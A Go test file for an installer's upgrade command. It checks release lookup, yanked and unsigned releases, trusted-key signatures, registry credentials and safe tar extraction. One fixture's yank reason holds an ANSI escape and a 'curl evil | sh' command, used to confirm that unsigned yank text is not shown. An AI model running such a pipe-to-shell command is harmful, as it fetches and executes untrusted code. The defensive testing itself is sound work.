package install

import (
	"archive/tar"
	"bytes"
	"cmp"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/google/go-containerregistry/pkg/authn"
	ggcrregistry "github.com/google/go-containerregistry/pkg/registry"
	"github.com/google/go-containerregistry/pkg/v1/empty"
	"github.com/google/go-containerregistry/pkg/v1/mutate"
	"github.com/google/go-containerregistry/pkg/v1/remote"
	"github.com/google/go-containerregistry/pkg/v1/tarball"
	"github.com/spf13/cobra"

	"github.com/norvexlabs/stowage/internal/payload"
	"github.com/norvexlabs/stowage/internal/registry"
	"github.com/norvexlabs/stowage/internal/release"
	"github.com/norvexlabs/stowage/internal/sigverify"
	"github.com/norvexlabs/stowage/internal/spec"
	"github.com/norvexlabs/stowage/internal/testutil"
)

// pubEnv is an install of 1.0.0 whose registry is an in-process one, where releases are published.
type pubEnv struct {
	*env
	prefix string
	own    string // the project's registry prefix, when the install pulls from prefix as a mirror
	pull   spec.Provider
	mu     sync.Mutex
	auth   []string // the Authorization headers the registry saw
	paths  []string // the paths it served
	ran    [][]string
	keys   payload.Files // the trusted keys every installer published carries
	// runKeys are the keys of the installer upgradeTo runs
	runKeys map[string][]byte
	down    atomic.Bool // signatures cannot be read
	// downFor: the signatures of this one digest (sha256-<hex>) cannot be read
	downFor atomic.Pointer[string]
}

func published(t *testing.T, pull spec.Provider, bake *payload.Account) *pubEnv {
	t.Helper()
	return publishedWith(t, pull, bake, nil)
}

// publishedWith is published with installers carrying the trusted keys given.
func publishedWith(t *testing.T, pull spec.Provider, bake *payload.Account, keys payload.Files) *pubEnv {
	t.Helper()
	p := &pubEnv{pull: pull, keys: keys}
	reg := ggcrregistry.New(ggcrregistry.Logger(log.New(io.Discard, "", 0)))
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		p.mu.Lock()
		p.auth = append(p.auth, r.Header.Get("Authorization"))
		p.paths = append(p.paths, r.Method+" "+r.URL.Path)
		p.mu.Unlock()
		if d := p.downFor.Load(); (d != nil && strings.HasSuffix(r.URL.Path, "/manifests/"+*d)) || (p.down.Load() && strings.Contains(r.URL.Path, "/manifests/sha256-")) {
			http.Error(w, "denied", http.StatusForbidden)
			return
		}
		reg.ServeHTTP(w, r)
	}))
	t.Cleanup(srv.Close)
	p.prefix = strings.TrimPrefix(srv.URL, "http://") + "/acme/notes"
	p.env = newEnv(t)
	p.r, p.self = p.publish("1.0.0", 1, nil, nil)
	p.r.Pull = bake
	if err := p.install(nil); err != nil {
		t.Fatal(err)
	}
	return p
}

func (p *pubEnv) spec(s *spec.Spec) {
	s.Registry.Prefix, s.Registry.Pull = cmp.Or(p.own, p.prefix), p.pull
}

// publish puts the installer of version at revision in the registry, tagged <version>-<revision>
// on stable unless mm changes the manifest; yank marks the published manifest only, as a yank does.
func (p *pubEnv) publish(version string, revision int, mm func(*release.Manifest), yank *release.Yank) (*Release, string) {
	t := p.t
	t.Helper()
	r, exe := testInstallerKeys(t, version, revision, p.spec, func(m *release.Manifest) {
		m.Tag = fmt.Sprintf("%s-%d", version, revision)
		if mm != nil {
			mm(m)
		}
	}, p.keys)
	raw, err := os.ReadFile(exe)
	if err != nil {
		t.Fatal(err)
	}
	d := p.pushInstaller("notes-stow", raw)
	m := *r.Manifest
	m.Artifacts.Installer, m.Yanked = d, yank
	p.putRelease(m.Tag, &m)
	return r, exe
}

func (p *pubEnv) pushInstaller(file string, exe []byte) string {
	t := p.t
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	_ = tw.WriteHeader(&tar.Header{Name: file, Mode: 0o755, Size: int64(len(exe)), Typeflag: tar.TypeReg})
	_, _ = tw.Write(exe)
	_ = tw.Close()
	l, err := tarball.LayerFromOpener(func() (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(buf.Bytes())), nil })
	if err != nil {
		t.Fatal(err)
	}
	img, err := mutate.AppendLayers(empty.Image, l)
	if err != nil {
		t.Fatal(err)
	}
	h, err := img.Digest()
	if err != nil {
		t.Fatal(err)
	}
	c := registry.New(authn.NewMultiKeychain())
	ref, err := c.Digest(p.prefix+"/notes-installer", h.String())
	if err != nil {
		t.Fatal(err)
	}
	if err := remote.Write(ref, img); err != nil {
		t.Fatal(err)
	}
	return h.String()
}

// signRelease signs the release manifest under tag with s.
func (p *pubEnv) signRelease(tag string, s *testutil.KeySigner) {
	t := p.t
	t.Helper()
	c := registry.New(authn.NewMultiKeychain())
	ref, _ := c.Tag(p.prefix+"/notes-release", tag)
	d, err := c.Get(context.Background(), ref)
	if err != nil || d == nil {
		t.Fatalf("%s: %v", ref, err)
	}
	s.Sign(t, ref.Context().Digest(d.Digest.String()))
}

func (p *pubEnv) putRelease(tag string, m *release.Manifest) {
	t := p.t
	t.Helper()
	data, err := m.Encode()
	if err != nil {
		t.Fatal(err)
	}
	c := registry.New(authn.NewMultiKeychain())
	ref, err := c.Tag(p.prefix+"/notes-release", tag)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.PutArtifact(context.Background(), ref, registry.Artifact{Type: release.MediaType, Data: data}); err != nil {
		t.Fatal(err)
	}
}

// upgradeTo runs upgrade --version v; the fetched installer runs in process, as `upgrade` with
// the options mod sets.
func (p *pubEnv) upgradeTo(v string, args []string, mod func(*Options)) error {
	in := p.installer(mod)
	in.R, _ = testInstallerOf(p.t, "0.9.0", 1, p.spec, nil) // the running installer: any release of the project
	in.R.Pull, in.R.Keys = p.r.Pull, p.runKeys
	in.O.Exec = func(ctx context.Context, exe string, args []string) error {
		p.ran = append(p.ran, args)
		files, err := payload.Read(exe)
		if err != nil {
			return err
		}
		r, err := Load(files)
		if err != nil {
			return err
		}
		next := p.installer(mod)
		next.R, next.O.Self = r, exe
		return next.Upgrade(ctx)
	}
	return in.UpgradeTo(context.Background(), v, args)
}

func TestUpgradeVersionRunsThatReleasesInstaller(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	p.publish("2.0.0", 1, nil, nil)
	want, _ := p.publish("2.0.0", 2, nil, nil)
	bad, _ := p.publish("2.0.0", 3, nil, &release.Yank{Reason: "broken", Date: time.Now()})
	p.publish("2.0.0", 4, func(m *release.Manifest) { m.Channel = "edge" }, nil)
	p.publish("3.0.0", 1, nil, nil)
	p.putRelease("stable", bad.Manifest) // a pointer holding the yanked release as it was: another tag's
	p.pushInstaller("other", []byte("x"))

	if err := p.upgradeTo("2.0.0", []string{"--no-provision"}, nil); err != nil {
		t.Fatalf("%v\n%s", err, p.log)
	}
	if len(p.ran) != 1 || !slices.Equal(p.ran[0], []string{"upgrade", "--dir", p.dir, "--no-provision"}) {
		t.Fatalf("ran %q", p.ran)
	}
	env := p.readEnv()
	if get(env, "STOWAGE_PROJECT_VERSION") != "2.0.0" || get(env, "STOWAGE_REVISION") != "2" {
		t.Fatalf("runs %s revision %s", get(env, "STOWAGE_PROJECT_VERSION"), get(env, "STOWAGE_REVISION"))
	}
	files, err := payload.Read(filepath.Join(p.dir, "notes-stow"))
	if err != nil {
		t.Fatal(err)
	}
	if kept, err := Load(files); err != nil || kept.Manifest.Tag != want.Manifest.Tag {
		t.Fatalf("kept installer: %v %v", kept, err)
	}
	if left, _ := filepath.Glob(filepath.Join(p.dir, NextDir+"-*")); len(left) != 0 {
		t.Errorf("left: %v", left)
	}
	for _, a := range p.auth {
		if a != "" {
			t.Errorf("public images read with %q", a)
		}
	}
}

// The installer of a release a newer Stowage built carries a spec with fields this one does not
// know: it is checked by its release manifest alone, then run.
func TestUpgradeVersionRunsTheInstallerOfANewerStowage(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	r, exe := testInstallerOf(t, "2.0.0", 1, p.spec, func(m *release.Manifest) { m.Tag = "2.0.0-1" })
	files, err := payload.Read(exe)
	if err != nil {
		t.Fatal(err)
	}
	var s map[string]any
	if err := json.Unmarshal(files[payload.Spec], &s); err != nil {
		t.Fatal(err)
	}
	s["a_key_of_a_newer_stowage"] = true
	files[payload.Spec], _ = json.Marshal(s)
	if _, err := Load(files); err == nil {
		t.Fatal("this installer reads the newer spec: the test proves nothing")
	}
	var buf bytes.Buffer
	if err := payload.Write(&buf, strings.NewReader("exe"), files); err != nil {
		t.Fatal(err)
	}
	m := *r.Manifest
	m.Artifacts.Installer = p.pushInstaller("notes-stow", buf.Bytes())
	p.putRelease(m.Tag, &m)
	in := p.installer(nil)
	in.R, _ = testInstallerOf(t, "0.9.0", 1, p.spec, nil)
	in.O.Exec = func(_ context.Context, _ string, args []string) error {
		p.ran = append(p.ran, args)
		return nil
	}
	if err := in.UpgradeTo(context.Background(), "2.0.0", nil); err != nil {
		t.Fatal(err)
	}
	if len(p.ran) != 1 || p.ran[0][0] != "upgrade" {
		t.Fatalf("ran %q", p.ran)
	}
}

func TestUpgradeVersionRefusals(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	p.publish("2.0.0", 1, nil, &release.Yank{Reason: "it eats data", Date: time.Now()})
	p.publish("0.5.0", 1, nil, nil)
	r, _ := testInstallerOf(t, "4.0.0", 1, p.spec, nil) // the release 5.0.0 names an installer of 4.0.0
	_, exe4 := testInstallerOf(t, "4.0.0", 1, p.spec, func(m *release.Manifest) { m.Tag = "4.0.0-1" })
	raw, _ := os.ReadFile(exe4)
	m5 := *r.Manifest
	m5.ProjectVersion, m5.Tag, m5.Artifacts.Installer = "5.0.0", "5.0.0-1", p.pushInstaller("notes-stow", raw)
	p.putRelease(m5.Tag, &m5)
	m6 := m5
	m6.ProjectVersion, m6.Tag, m6.Artifacts.Installer = "6.0.0", "6.0.0-1", ""
	p.putRelease(m6.Tag, &m6)
	m7 := m5
	m7.ProjectVersion, m7.Tag, m7.Artifacts.Installer = "7.0.0", "7.0.0-1", p.pushInstaller("other-stow", raw)
	p.putRelease(m7.Tag, &m7)
	for _, c := range []struct{ v, want string }{
		{"9.0.0", "notes 9.0.0 is not published on stable"},
		{"1.0.0", ""}, // already runs: nothing fetched
		{"2.0.0", "notes 2.0.0 is yanked on stable: it eats data"},
		{"0.5.0", "runs notes 1.0.0 (revision 1), after notes 0.5.0 (revision 1): `"},
		{"5.0.0", "the installer carries notes 4.0.0 (revision 1, 4.0.0-1), not the release 5.0.0-1"},
		{"6.0.0", "notes 6.0.0 (6.0.0-1) has no installer"},
		{"7.0.0", "no notes-stow in the layer"},
	} {
		err := p.upgradeTo(c.v, nil, nil)
		if c.want == "" {
			if err != nil || !strings.Contains(p.out.String(), "already runs notes 1.0.0 (revision 1)") {
				t.Errorf("%s: %v %s", c.v, err, p.out)
			}
			continue
		}
		if err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: %v, want %q", c.v, err, c.want)
		}
	}
	if len(p.ran) != 0 {
		t.Errorf("ran %q", p.ran)
	}
	if left, _ := filepath.Glob(filepath.Join(p.dir, NextDir+"-*")); len(left) != 0 {
		t.Errorf("left: %v", left)
	}
	if get(p.readEnv(), "STOWAGE_PROJECT_VERSION") != "1.0.0" {
		t.Error("the install changed")
	}
}

// An install whose release carries trusted keys upgrades only to a release signed by one of
// them: not to an unsigned one, nor one signed by another key, and a registry that cannot say is
// no answer.
func TestUpgradeVersionNeedsASignatureByAKeptKey(t *testing.T) {
	t.Parallel()
	old, rotated, other := testutil.NewKeySigner(t), testutil.NewKeySigner(t), testutil.NewKeySigner(t)
	p := publishedWith(t, spec.Provider{Name: "none"}, nil, payload.Files{payload.KeysDir + "old.pub": old.PEM, payload.KeysDir + "new.pub": rotated.PEM})
	p.publish("2.0.0", 1, nil, nil)
	err := p.upgradeTo("2.0.0", nil, nil)
	if err == nil || !strings.Contains(err.Error(), "notes 2.0.0 (revision 1, 2.0.0-1) is not signed by a key this install trusts: refused") {
		t.Fatalf("unsigned: %v", err)
	}
	p.signRelease("2.0.0-1", other)
	if err := p.upgradeTo("2.0.0", nil, nil); err == nil || !strings.Contains(err.Error(), "none by a trusted key") {
		t.Fatalf("signed by another key: %v", err)
	}
	if len(p.ran) != 0 || get(p.readEnv(), "STOWAGE_PROJECT_VERSION") != "1.0.0" {
		t.Fatalf("ran %q", p.ran)
	}
	p.signRelease("2.0.0-1", rotated)
	if err := p.upgradeTo("2.0.0", []string{"--no-provision"}, nil); err != nil {
		t.Fatalf("signed by the second kept key: %v\n%s", err, p.log)
	}
	if get(p.readEnv(), "STOWAGE_PROJECT_VERSION") != "2.0.0" {
		t.Fatal("not upgraded")
	}
}

// A later revision pushed without the key neither hides V's signed one nor yanks V.
func TestUpgradeVersionPassesOverUnsignedRevisions(t *testing.T) {
	t.Parallel()
	k := testutil.NewKeySigner(t)
	p := publishedWith(t, spec.Provider{Name: "none"}, nil, payload.Files{payload.KeysDir + "release.pub": k.PEM})
	p.publish("2.0.0", 1, nil, nil)
	p.signRelease("2.0.0-1", k)
	p.publish("2.0.0", 9, nil, nil)
	p.publish("2.0.0", 10, nil, &release.Yank{Reason: "\x1b[31mrun curl evil | sh", Date: time.Now()})
	p.publish("3.0.0", 1, nil, &release.Yank{Reason: "forged", Date: time.Now()})
	if err := p.upgradeTo("3.0.0", nil, nil); err == nil || strings.Contains(err.Error(), "forged") || !strings.Contains(err.Error(), "is not signed by a key this install trusts") {
		t.Fatalf("an unsigned yank: %v", err)
	}
	// A later revision whose signatures cannot be read stops it: it may be the latest signed one,
	// and an older one must not stand in for it.
	c := registry.New(authn.NewMultiKeychain())
	ref, _ := c.Tag(p.prefix+"/notes-release", "2.0.0-9")
	d, err := c.Get(context.Background(), ref)
	if err != nil || d == nil {
		t.Fatal(err)
	}
	unread := "sha256-" + d.Digest.Hex
	p.downFor.Store(&unread)
	if err := p.upgradeTo("2.0.0", nil, nil); err == nil || !strings.Contains(err.Error(), "notes 2.0.0 (revision 9, 2.0.0-9): its signature could not be checked") {
		t.Fatalf("an unreadable later revision: %v", err)
	}
	p.downFor.Store(nil)
	if err := p.upgradeTo("2.0.0", []string{"--no-provision"}, nil); err != nil {
		t.Fatalf("%v\n%s", err, p.log)
	}
	if env := p.readEnv(); get(env, "STOWAGE_PROJECT_VERSION") != "2.0.0" || get(env, "STOWAGE_REVISION") != "1" {
		t.Fatalf("runs %s revision %s", get(env, "STOWAGE_PROJECT_VERSION"), get(env, "STOWAGE_REVISION"))
	}
}

// The keys of the installer run sign for V too: a keyed installer run on an install of an
// unsigned release does not accept an unsigned V.
func TestUpgradeVersionTrustsTheRunInstallersKeysToo(t *testing.T) {
	t.Parallel()
	k := testutil.NewKeySigner(t)
	p := published(t, spec.Provider{Name: "none"}, nil)
	p.runKeys = map[string][]byte{"release.pub": k.PEM}
	p.publish("2.0.0", 1, nil, nil)
	if err := p.upgradeTo("2.0.0", nil, nil); err == nil || !strings.Contains(err.Error(), "is not signed by a key this install trusts") {
		t.Fatalf("unsigned: %v", err)
	}
	p.signRelease("2.0.0-1", k)
	if err := p.upgradeTo("2.0.0", []string{"--no-provision"}, nil); err != nil {
		t.Fatalf("%v\n%s", err, p.log)
	}
}

// When the install's release carries keys, they alone decide: an installer run that carries an
// older key (one a later release dropped) does not bring it back.
func TestUpgradeVersionTrustsTheKeptKeysOverTheRunInstallers(t *testing.T) {
	t.Parallel()
	dropped, current := testutil.NewKeySigner(t), testutil.NewKeySigner(t)
	p := publishedWith(t, spec.Provider{Name: "none"}, nil, payload.Files{payload.KeysDir + "release.pub": current.PEM})
	p.runKeys = map[string][]byte{"release.pub": dropped.PEM}
	p.publish("2.0.0", 1, nil, nil)
	p.signRelease("2.0.0-1", dropped)
	if err := p.upgradeTo("2.0.0", nil, nil); err == nil || !strings.Contains(err.Error(), "is not signed by a key this install trusts") {
		t.Fatalf("signed by a dropped key: %v", err)
	}
	if !strings.Contains(p.log.String(), "passed over: notes 2.0.0 (revision 1, 2.0.0-1)") {
		t.Errorf("the refused revision is not logged:\n%s", p.log)
	}
}

func TestUpgradeVersionFailsWhenTheSignaturesCannotBeRead(t *testing.T) {
	t.Parallel()
	k := testutil.NewKeySigner(t)
	p := publishedWith(t, spec.Provider{Name: "none"}, nil, payload.Files{payload.KeysDir + "release.pub": k.PEM})
	p.publish("2.0.0", 1, nil, nil)
	p.signRelease("2.0.0-1", k)
	p.down.Store(true) // the signatures' fallback tag cannot be read
	err := p.upgradeTo("2.0.0", nil, nil)
	if err == nil || !strings.Contains(err.Error(), "its signature could not be checked") || errors.Is(err, sigverify.ErrUnsigned) {
		t.Fatalf("got %v", err)
	}
	if len(p.ran) != 0 {
		t.Fatalf("ran %q", p.ran)
	}
}

func TestUpgradeVersionKeepsTheInstallerThatFailed(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	p.publish("2.0.0", 1, nil, nil)
	in := p.installer(nil)
	in.O.Exec = func(context.Context, string, []string) error { return ExitCode(3) }
	err := in.UpgradeTo(context.Background(), "2.0.0", nil)
	if err != ExitCode(3) {
		t.Fatalf("%v", err)
	}
	kept, _ := filepath.Glob(filepath.Join(p.dir, NextDir+"-*", "notes-stow"))
	if len(kept) != 1 || !strings.Contains(p.log.String(), "the fetched installer is kept: "+kept[0]) {
		t.Fatalf("%v\n%s", kept, p.log)
	}
	if fi, err := os.Stat(filepath.Dir(kept[0])); err != nil || fi.Mode().Perm() != 0o700 {
		t.Fatalf("%v %v", fi, err)
	}
}

func TestUpgradeVersionNeedsAnInstallThatPulls(t *testing.T) {
	t.Parallel()
	e := newEnv(t)
	for _, k := range []string{"api", "web", "postgres", "front"} {
		e.docker.loaded["ghcr.io/acme/notes/notes-"+k+":1.0.0"] = config
	}
	if err := e.install(func(o *Options) { o.Offline = true }); err != nil {
		t.Fatal(err)
	}
	err := e.installer(nil).UpgradeTo(context.Background(), "2.0.0", nil)
	if err == nil || !strings.Contains(err.Error(), "made with --offline") {
		t.Fatalf("%v", err)
	}
	// The same release again: no hint at --version, which this install cannot use.
	if err := e.upgrade(nil); err != nil || !strings.Contains(e.out.String(), "already runs") || strings.Contains(e.out.String(), "--version") {
		t.Fatalf("%v\n%s", err, e.out)
	}
	p := installed(t)
	if err := p.upgrade(nil); err != nil || !strings.Contains(p.out.String(), "upgrade --version V --dir") {
		t.Fatalf("%v\n%s", err, p.out)
	}
}

func TestUpgradeVersionReadsWithThePullAccount(t *testing.T) {
	t.Parallel()
	basic := func(u, p string) string { return "Basic " + base64.StdEncoding.EncodeToString([]byte(u+":"+p)) }
	pull := spec.Provider{Name: "token", Config: map[string]any{"user": "reader", "token_env": "NOTES_PULL_TOKEN"}}
	for _, c := range []struct {
		env, want string
	}{
		{"", basic("baked", "baked-pw")},
		{"from-env", basic("reader", "from-env")},
	} {
		p := published(t, pull, &payload.Account{User: "baked", Password: "baked-pw"})
		p.vars["NOTES_PULL_TOKEN"] = c.env
		p.publish("2.0.0", 1, nil, nil)
		p.auth = nil
		if err := p.upgradeTo("2.0.0", nil, nil); err != nil {
			t.Fatalf("%v\n%s", err, p.log)
		}
		// The in-process registry asks for no login, so the account is sent as basic auth.
		if !slices.Contains(p.auth, c.want) || slices.ContainsFunc(p.auth, func(a string) bool { return a != "" && a != c.want }) {
			t.Errorf("env %q: auth %q, want %q", c.env, p.auth, c.want)
		}
	}
}

// layerOf is a layer holding entries.
type layerOf []*tar.Header

func (l layerOf) Uncompressed() (io.ReadCloser, error) {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, h := range l {
		_ = tw.WriteHeader(h)
		_, _ = tw.Write(make([]byte, h.Size))
	}
	_ = tw.Close()
	return io.NopCloser(&buf), nil
}

func TestExtractTakesOneRegularFileWithinBounds(t *testing.T) {
	old := maxInstaller
	maxInstaller = 8
	t.Cleanup(func() { maxInstaller = old })
	reg := func(n string, size int64) *tar.Header {
		return &tar.Header{Name: n, Size: size, Mode: 0o755, Typeflag: tar.TypeReg}
	}
	for _, c := range []struct {
		l    layerOf
		want string
	}{
		{layerOf{reg("x", 1), reg("notes-stow", 8)}, ""},
		{layerOf{reg("notes-stow", 9)}, "more than 8"},
		{layerOf{reg("notes-stow", 1), reg("notes-stow", 1)}, "not one regular file"},
		{layerOf{{Name: "notes-stow", Typeflag: tar.TypeSymlink, Linkname: "/bin/sh"}}, "not one regular file"},
		{layerOf{reg("x", 1)}, "no notes-stow"},
	} {
		dst := filepath.Join(t.TempDir(), "notes-stow")
		err := extract(c.l, "notes-stow", dst)
		if c.want == "" {
			fi, serr := os.Stat(dst)
			if err != nil || serr != nil || fi.Size() != 8 || fi.Mode().Perm() != 0o700 {
				t.Errorf("%v %v %v", err, serr, fi)
			}
		} else if err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("%v, want %q", err, c.want)
		}
	}
}

// A parent's flag given to the subcommand is given again: `k8s --namespace` to `k8s upgrade`.
func TestPassedGivesAParentsFlagsAgain(t *testing.T) {
	t.Parallel()
	var got []string
	k := &cobra.Command{Use: "k8s"}
	k.PersistentFlags().String("namespace", "x", "")
	up := &cobra.Command{Use: "upgrade", RunE: func(cmd *cobra.Command, _ []string) error { got = passed(cmd, "version"); return nil }}
	up.Flags().String("version", "", "")
	k.AddCommand(up)
	k.SetArgs([]string{"--namespace", "prod", "upgrade", "--version", "2.0.0"})
	if err := k.Execute(); err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(got, []string{"--namespace=prod"}) {
		t.Errorf("passed %q", got)
	}
}

func TestPassedGivesTheFlagsAgain(t *testing.T) {
	t.Parallel()
	var sets []string
	var to, answers string
	var noInput bool
	cmd := &cobra.Command{Use: "upgrade", RunE: func(*cobra.Command, []string) error { return nil }}
	cmd.Flags().String("dir", "", "")
	cmd.Flags().StringVar(&to, "version", "", "")
	cmd.Flags().StringArrayVar(&sets, "set", nil, "")
	cmd.Flags().StringVar(&answers, "answers", "", "")
	cmd.Flags().BoolVar(&noInput, "no-input", false, "")
	cmd.Flags().Bool("dry-run", false, "")
	cmd.SetArgs([]string{"--version", "2.0.0", "--dir", "/x", "--set", "A=b,c", "--set", "D=", "--no-input", "--answers", "a.yaml"})
	if err := cmd.Execute(); err != nil {
		t.Fatal(err)
	}
	got := passed(cmd, "version")
	want := []string{"--answers=a.yaml", "--no-input=true", "--set=A=b,c", "--set=D="}
	if !slices.Equal(got, want) {
		t.Fatalf("%q, want %q", got, want)
	}
}

func TestUpgradeVersionReadsWithTheDockerLoginOrAnonymously(t *testing.T) {
	cfg := t.TempDir()
	t.Setenv("DOCKER_CONFIG", cfg)
	login := "Basic " + base64.StdEncoding.EncodeToString([]byte("operator:pw"))
	for _, c := range []struct {
		pull   spec.Provider
		want   string
		mirror bool
	}{
		{spec.Provider{Name: "none"}, "", false},
		{spec.Provider{Name: "none"}, login, true},
		{spec.Provider{Name: "token", Config: map[string]any{"user": "reader", "token_env": "NOTES_PULL_TOKEN"}}, login, false},
	} {
		p := published(t, c.pull, nil)
		if c.mirror { // the install pulls from a mirror: the project's own prefix is elsewhere
			p.own = "registry.example/acme/notes"
			p.r, p.self = p.publish("1.0.0", 1, nil, nil)
			_ = os.RemoveAll(p.dir)
			if err := p.install(func(o *Options) { o.Registry = p.prefix }); err != nil {
				t.Fatal(err)
			}
		}
		host, _, _ := strings.Cut(p.prefix, "/")
		_ = os.WriteFile(filepath.Join(cfg, "config.json"), []byte(`{"auths":{"`+host+`":{"auth":"`+strings.TrimPrefix(login, "Basic ")+`"}}}`), 0o600)
		p.publish("2.0.0", 1, nil, nil)
		p.auth = nil
		if err := p.upgradeTo("2.0.0", nil, nil); err != nil {
			t.Fatalf("%v\n%s", err, p.log)
		}
		// The client pings the registry anonymously first.
		if (c.want != "" && !slices.Contains(p.auth, c.want)) || slices.ContainsFunc(p.auth, func(a string) bool { return a != "" && a != c.want }) {
			t.Errorf("%s: auth %q, want %q", c.pull.Name, p.auth, c.want)
		}
	}
}

func TestUpgradeVersionReadsOnlyWhatCanBeARelease(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	two, _ := p.publish("2.0.0", 1, nil, nil)
	for _, tag := range []string{"stable", "latest", "sha256-" + strings.Repeat("a", 64) + ".sig"} {
		p.putRelease(tag, two.Manifest)
	}
	p.paths = nil
	if err := p.upgradeTo("2.0.0", nil, nil); err != nil {
		t.Fatalf("%v\n%s", err, p.log)
	}
	for _, path := range p.paths {
		if strings.Contains(path, "/notes-release/manifests/") && !strings.HasSuffix(path, "-1") {
			t.Errorf("read %s", path)
		}
	}
}

func TestUpgradeVersionTakesAnySpellingTheSchemeHoldsEqual(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	regex := func(m *release.Manifest) {
		m.Scheme = release.Scheme{Provider: "regex", Config: map[string]any{"pattern": `(?P<maj>\d+)\.(?P<min>\d+)(\.\d+)?`, "order": []any{"maj:int", "min:int"}}}
	}
	first, _ := p.publish("2.01", 1, regex, nil)
	want, _ := p.publish("2.1", 1, regex, nil)
	in := p.installer(nil)
	var got string
	in.O.Exec = func(_ context.Context, exe string, _ []string) error {
		files, err := payload.Read(exe)
		if err != nil {
			return err
		}
		r, err := Load(files)
		if err != nil {
			return err
		}
		got = r.Manifest.Tag
		return nil
	}
	for v, want := range map[string]string{"2.1": want.Manifest.Tag, "2.01": first.Manifest.Tag, "02.1": first.Manifest.Tag} {
		got = ""
		// The spelling asked wins between equal revisions; else the first tag in sorted order.
		if err := in.UpgradeTo(context.Background(), v, nil); err != nil || got != want {
			t.Errorf("%s: %v: ran %q, want %q", v, err, got, want)
		}
	}
}

func TestUpgradeVersionToAnEarlierRevisionIsRefused(t *testing.T) {
	t.Parallel()
	p := published(t, spec.Provider{Name: "none"}, nil)
	p.publish("1.0.0", 2, nil, nil)
	if err := p.upgradeTo("1.0.0", nil, nil); err != nil {
		t.Fatalf("%v\n%s", err, p.log)
	}
	if get(p.readEnv(), "STOWAGE_REVISION") != "2" {
		t.Fatal("not on revision 2")
	}
	p.publish("1.0.0", 2, nil, &release.Yank{Reason: "bad", Date: time.Now()})
	p.ran = nil
	err := p.upgradeTo("1.0.0", nil, nil)
	if err == nil || !strings.Contains(err.Error(), "runs notes 1.0.0 (revision 2), after notes 1.0.0 (revision 1)") || len(p.ran) != 0 {
		t.Fatalf("%v, ran %q", err, p.ran)
	}
}

func TestUpgradeVersionFailsOnAManifestItCannotRead(t *testing.T) {
	t.Parallel()
	for _, c := range []struct {
		name string
		put  func(p *pubEnv)
	}{
		{"newer format", func(p *pubEnv) {
			ref, _ := registry.New(authn.NewMultiKeychain()).Tag(p.prefix+"/notes-release", "2.0.0-2")
			if _, err := registry.New(authn.NewMultiKeychain()).PutArtifact(context.Background(), ref, registry.Artifact{Type: release.MediaType, Data: []byte(`{"schemaVersion": 9}`)}); err != nil {
				t.Fatal(err)
			}
		}},
		{"unknown scheme", func(p *pubEnv) {
			p.publish("2.0.0", 2, func(m *release.Manifest) { m.Scheme = release.Scheme{Provider: "lunar"} }, nil)
		}},
	} {
		p := published(t, spec.Provider{Name: "none"}, nil)
		p.publish("2.0.0", 1, nil, nil) // readable, but perhaps not V's latest revision
		c.put(p)
		err := p.upgradeTo("2.0.0", nil, nil)
		if err == nil || !strings.Contains(err.Error(), "release manifest 2.0.0-2 could not be read (from another Stowage?") || len(p.ran) != 0 {
			t.Errorf("%s: %v, ran %q", c.name, err, p.ran)
		}
	}
}
